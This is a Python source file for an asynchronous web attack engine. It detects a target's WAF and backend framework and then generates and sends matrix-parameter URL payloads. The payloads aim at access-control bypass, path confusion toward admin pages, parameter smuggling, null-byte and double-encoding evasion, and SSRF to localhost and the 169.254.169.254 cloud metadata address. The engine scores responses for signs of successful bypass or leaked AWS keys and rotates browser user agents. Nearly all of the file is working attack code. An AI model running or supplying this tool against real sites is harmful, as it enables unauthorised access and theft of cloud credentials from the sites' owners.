import asyncio
import logging
import random
import re
import hashlib
from typing import List, Dict, Optional, Any, Mapping, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


class MatrixParameterEngine:
    def __init__(self, waf_detector, backend_identifier, *, max_payloads: int = 240, max_concurrency: int = 12):
        self.waf_detector = waf_detector
        self.backend_identifier = backend_identifier
        self.max_payloads = max_payloads
        self.max_concurrency = max_concurrency
        self.matrix_supported: Optional[bool] = None
        self._baseline: Optional[Dict[str, Any]] = None
        self.user_agents: List[Tuple[str, str]] = [
            ("desktop-chrome",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
            ("desktop-firefox",
             "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"),
            ("desktop-safari",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
             "(KHTML, like Gecko) Version/17.2 Safari/605.1.15"),
        ]

    async def generate_payloads(self, target_url: str, base_path: str, http_client) -> List[str]:
        base_path = self._normalize_base_path(base_path)
        try:
            waf_results = await self.waf_detector.detect(target_url, http_client)
        except TypeError:
            waf_results = await self.waf_detector.detect(target_url, http_client)

        try:
            backend_results = await self.backend_identifier.identify(target_url, http_client)
        except TypeError:
            backend_results = await self.backend_identifier.identify(target_url, http_client)

        waf_key = self._choose_waf_key(waf_results)
        backend_key = self._choose_backend_key(backend_results)

        if self.matrix_supported is None:
            self.matrix_supported = await self._check_matrix_support(target_url, http_client)
            logger.info(f"[Matrix] Semicolon/matrix support: {self.matrix_supported}")

        techniques = self._get_matrix_techniques(backend_key, waf_key)
        logger.info(f"[Matrix] Techniques: {', '.join(sorted(techniques))}")

        payloads: List[str] = []
        seen: set = set()

        def add(p: str):
            if p and p not in seen:
                seen.add(p)
                payloads.append(p)

        base = base_path.rstrip("/")

        if "basic" in techniques:
            basic_params = [
                "bypass", "debug", "test", "admin", "root",
                "auth", "token", "key", "access", "privilege",
                "session", "user", "id", "role", "mode",
            ]
            basic_values = [
                "true", "false", "1", "0", "yes", "no",
                "enable", "disable", "on", "off", "grant",
                "admin", "root", "super", "high", "full",
            ]
            for k in basic_params:
                for v in basic_values:
                    add(f"{base};{k}={v}")
                    add(f"{base};{k}={v};another=test")

        if "path_confusion" in techniques:
            add(f";bypass{base}")
            add(f"/;bypass={base.lstrip('/')}")
            add(f"{base};/../admin")
            add(f"{base};/..;/admin")
            add(f"{base};bypass;/admin")

        if "parameter_smuggling" in techniques:
            add(f"{base};param=value?query=bypass")
            add(f"{base};param=value#fragment")
            add(f"{base};param=value&other=param")
            add(f"{base};param=value?")
            add(f"{base};?")

        if "ssrf" in techniques:
            targets = ["localhost", "127.0.0.1", "169.254.169.254", "192.168.0.1", "10.0.0.1", "internal-api"]
            for t in targets:
                add(f"{base};@{t}")
                add(f"{base};@{t}:8080")
                add(f"{base};@{t}/admin")
                add(f"{base};@{t}/api")

        if "acl_bypass" in techniques:
            add(f"{base};")
            add(f"{base}%3b")       
            add(f"{base}%253b")      
            add(f"{base};\t")
            add(f"{base};\n")
            add(f"{base}; ")        
            add(f"{base};bypass")
            add(f"{base};matrix")
            add(f"{base};123")
            add(f"{base};version=1")
            add(f"{base};x-nginx-cache=BYPASS")

        if "special_chars" in techniques:
            specials = ["%00", "%0a", "%0d", "%ff", "%20", "%2f", "%5c"]
            current = list(payloads)
            for p in current:
                for ch in specials:
                    add(f"{p}{ch}")
                    add(f"{ch}{p}")

        if "encoding" in techniques:
            more = []
            for p in payloads:
                more.extend(self._percent_case_variants(p))
            for p in more:
                add(p)
            for p in list(payloads):
                add(self._double_encode_percent(p))

        if len(payloads) > self.max_payloads:
            payloads = self._stable_cap(payloads, self.max_payloads)

        logger.info(f"[Matrix] Generated {len(payloads)} payloads (cap={self.max_payloads})")
        return payloads

    async def test_payloads(self, target_url: str, base_path: str, payloads: List[str], http_client) -> List[Dict[str, Any]]:
        base_path = self._normalize_base_path(base_path)
        results: List[Dict[str, Any]] = []
        baseline_url = f"{target_url.rstrip('/')}{base_path}"
        self._baseline = await self._get_snapshot(http_client, baseline_url)

        sem = asyncio.Semaphore(self.max_concurrency)

        async def run_one(p: str) -> Optional[Dict[str, Any]]:
            test_url = f"{target_url.rstrip('/')}{p}"
            try:
                async with sem:
                    snap = await self._get_snapshot(http_client, test_url)
                if not snap:
                    return None

                if self._is_valid_bypass(snap, self._baseline):
                    finding = {
                        "payload": p,
                        "url": test_url,
                        "status_code": snap["status"],
                        "response_size": len(snap["body"]),
                        "technique": "matrix_parameters",
                        "proof": {
                            "cookie_fp": snap["cookie_fp"],
                            "body_len": len(snap["body"]),
                            "body_md5": snap["body_md5"],
                            "headers_sample": dict(list(snap["headers"].items())[:6]),
                        },
                    }
                    return finding

                if 300 <= snap["status"] < 400:
                    loc = snap["headers"].get("location", "")
                    if any(k in (loc or "").lower() for k in ("admin", "dashboard", "console", "manage")):
                        return {
                            "payload": p,
                            "url": test_url,
                            "status_code": snap["status"],
                            "redirect_location": loc,
                            "technique": "matrix_parameters_redirect",
                        }

                if self._is_ssrf_response_snapshot(snap):
                    snippet = snap["body"][:200] + "..." if len(snap["body"]) > 200 else snap["body"]
                    return {
                        "payload": p,
                        "url": test_url,
                        "status_code": snap["status"],
                        "response_text": snippet,
                        "technique": "matrix_parameters_ssrf",
                    }

            except Exception as e:
                logger.debug(f"[Matrix] Error {test_url}: {e}")
            return None

        tasks = [asyncio.create_task(run_one(p)) for p in payloads]
        for res in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(res, Exception):
                logger.debug(f"[Matrix] Task error: {res}")
                continue
            if res:
                results.append(res)
                logger.info(f"[Matrix] Finding: {res.get('payload')} -> {res.get('status_code')}")

        return results

    async def _check_matrix_support(self, target_url: str, http_client) -> bool:
        test_url = f"{target_url.rstrip('/')}/test;matrix=123"
        try:
            resp = await self._safe_get(http_client, test_url, timeout=8)
            if not resp:
                return False
            status, hdrs, _ = await self._normalize_response(resp)
            final = getattr(resp, "url", None)
            final_s = str(final) if final is not None else test_url
            parsed = urlparse(final_s)
            if ";matrix=123" in (parsed.path or ""):
                return True

            h = _lower_headers(hdrs)
            for k in ("x-matrix-param", "x-semicolon-param", "x-junction-param", "x-path-info"):
                if k in h:
                    return True
            return False
        except Exception as e:
            logger.debug(f"[Matrix] Support probe failed: {e}")
            return False

    def _get_matrix_techniques(self, backend: str, waf: str) -> List[str]:
        if not self.matrix_supported:
            return ["basic", "path_confusion", "ssrf", "encoding"]

        techniques: List[str] = []

        b = backend.lower()
        if "spring" in b:
            techniques += ["acl_bypass", "ssrf", "parameter_smuggling", "path_confusion", "encoding", "special_chars"]
        elif "flask" in b:
            techniques += ["path_confusion", "parameter_smuggling", "encoding"]
        elif "node" in b or "express" in b:
            techniques += ["ssrf", "path_confusion", "encoding"]

        w = waf.lower()
        if "cloudflare" in w:
            techniques += ["encoding", "special_chars"]
        if "aws" in w:
            techniques += ["ssrf", "encoding"]
        techniques += ["basic", "encoding"]

        return sorted(set(techniques))

    def _is_valid_bypass(self, snap: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> bool:
        status = snap["status"]
        body = snap["body"] if isinstance(snap["body"], str) else ""
        lbody = body.lower()

        if not (200 <= status < 300):
            return False

        block_indicators = ["access denied", "forbidden", "unauthorized", "blocked", "not authorized", "captcha"]
        if any(b in lbody for b in block_indicators):
            return False

        if baseline:
            b_status = baseline["status"]
            b_body = baseline["body"]
            if b_status in (401, 403, 404):
                if snap["cookie_fp"] != baseline["cookie_fp"]:
                    return True
                if snap["body_md5"] != baseline["body_md5"]:
                    return True
                if abs(len(b_body) - len(body)) > max(64, int(0.15 * max(len(b_body), len(body)))):
                    return True
                return False

            same_len_ratio = min(len(b_body), len(body)) / max(1, max(len(b_body), len(body)))
            if same_len_ratio > 0.95 and snap["body_md5"] == baseline["body_md5"]:
                return False

            if snap["cookie_fp"] != baseline["cookie_fp"]:
                return True
            if abs(len(b_body) - len(body)) > max(64, int(0.10 * max(len(b_body), len(body)))):
                return True
            return False

        sensitive = ["admin", "dashboard", "password", "secret", "root", "config", "backup", "console"]
        return any(s in lbody for s in sensitive)

    def _is_ssrf_response_snapshot(self, snap: Dict[str, Any]) -> bool:
        if snap["status"] != 200:
            return False
        content = snap["body"] or ""

        indicators = [
            "EC2 Metadata", "Instance Info", "Metadata Service",
            "AWS Access Key", "Secret Access Key", "cloud-init",
            "localhost", "127.0.0.1",
        ]
        if any(i.lower() in content.lower() for i in indicators):
            return True

        if "<title>Error</title>" in content and "Internal Server Error" in content:
            if "Connection refused" in content or "Failed to connect" in content:
                return True
        if '"error":' in content and ('"ECONNREFUSED"' in content or '"ENOTFOUND"' in content):
            return True

        return False

    async def _get_snapshot(self, http_client, url: str) -> Optional[Dict[str, Any]]:
        try:
            ua = random.choice(self.user_agents)[1]
            resp = await self._safe_get(http_client, url, headers={"User-Agent": ua}, timeout=12)
            if not resp:
                return None
            status, headers, body = await self._normalize_response(resp)
            h = _lower_headers(headers)
            body_s = body if isinstance(body, str) else ""
            return {
                "status": status,
                "headers": h,
                "body": body_s,
                "body_md5": hashlib.md5(body_s.encode("utf-8", errors="ignore")).hexdigest(),
                "cookie_fp": self._cookie_fingerprint(h.get("set-cookie", "")),
            }
        except Exception as e:
            logger.debug(f"[Matrix/Snapshot] failed for {url}: {e}")
            return None

    async def _safe_get(self, http_client, url: str, headers: Optional[Dict[str, str]] = None, timeout: int = 12):
        try:
            return await http_client.get(url, headers=headers or {}, timeout=timeout, follow_redirects=True)
        except TypeError:
            try:
                return await http_client.get(url, headers=headers or {}, timeout=timeout)
            except Exception as e:
                logger.debug(f"_safe_get failed for {url}: {e}")
                return None
        except Exception as e:
            logger.debug(f"_safe_get failed for {url}: {e}")
            return None

    async def _normalize_response(self, resp) -> Tuple[int, Mapping[str, str], str]:
        status = getattr(resp, "status_code", None)
        if status is None:
            status = getattr(resp, "status", None)
        if status is None:
            status = 0

        headers = getattr(resp, "headers", {}) or {}
        text_val = getattr(resp, "text", None)
        if isinstance(text_val, str):
            body = text_val
        else:
            body = ""
            try:
                if callable(text_val):
                    maybe = text_val()
                    if asyncio.iscoroutine(maybe):
                        body = await maybe
                    else:
                        body = str(maybe) if maybe is not None else ""
            except Exception:
                body = ""
        return int(status), headers, body

    def _normalize_base_path(self, base_path: str) -> str:
        base_path = base_path.strip() or "/"
        if not base_path.startswith("/"):
            base_path = "/" + base_path
        return base_path

    def _choose_waf_key(self, waf_results: Dict[str, float]) -> str:
        if not waf_results:
            return "unknown"
        best = max(waf_results.items(), key=lambda x: x[1])[0].lower()
        for k in ("cloudflare", "akamai", "imperva", "aws", "waf", "f5", "big-ip"):
            if k in best:
                return k
        return best

    def _choose_backend_key(self, backend_results: Dict[str, Dict[str, Any]]) -> str:
        if not backend_results:
            return "unknown"
        best = max(backend_results.items(), key=lambda x: x[1].get("confidence", 0.0))[0]
        return best

    def _percent_case_variants(self, s: str) -> List[str]:
        out = set([s])
        for m in re.finditer(r"%[0-9a-fA-F]{2}", s):
            i, j = m.span()
            head, enc, tail = s[:i], s[i:j], s[j:]
            out.add(head + enc.upper() + tail)
            out.add(head + enc.lower() + tail)
        return list(out)

    def _double_encode_percent(self, s: str) -> str:
        return s.replace("%", "%25")

    def _stable_cap(self, items: List[str], k: int) -> List[str]:
        scored = [(hashlib.sha1(i.encode("utf-8")).hexdigest(), i) for i in items]
        scored.sort(key=lambda x: x[0])
        return [i for _, i in scored[:k]]

    def _cookie_fingerprint(self, set_cookie_val: str) -> str:
        sc = set_cookie_val or ""
        if not sc:
            return "none"
        parts = [p.strip() for p in re.split(r",(?=[^ ;]+=)", sc)]
        names = []
        for p in parts:
            name = p.split("=", 1)[0].strip().lower()
            attrs = set()
            for a in ("httponly", "secure", "samesite", "path", "domain", "max-age"):
                if re.search(rf"\b{a}\b", p, re.I):
                    attrs.add(a)
            names.append(f"{name};{'|'.join(sorted(attrs))}")
        names.sort()
        return hashlib.sha1(";".join(names).encode("utf-8")).hexdigest()


def _lower_headers(h: Mapping[str, str]) -> Dict[str, str]:
    try:
        return {str(k).lower(): str(v) for k, v in dict(h or {}).items()}
    except Exception:
        out: Dict[str, str] = {}
        try:
            for k in h.keys(): 
                out[str(k).lower()] = str(h.get(k))
        except Exception:
            pass
        return out
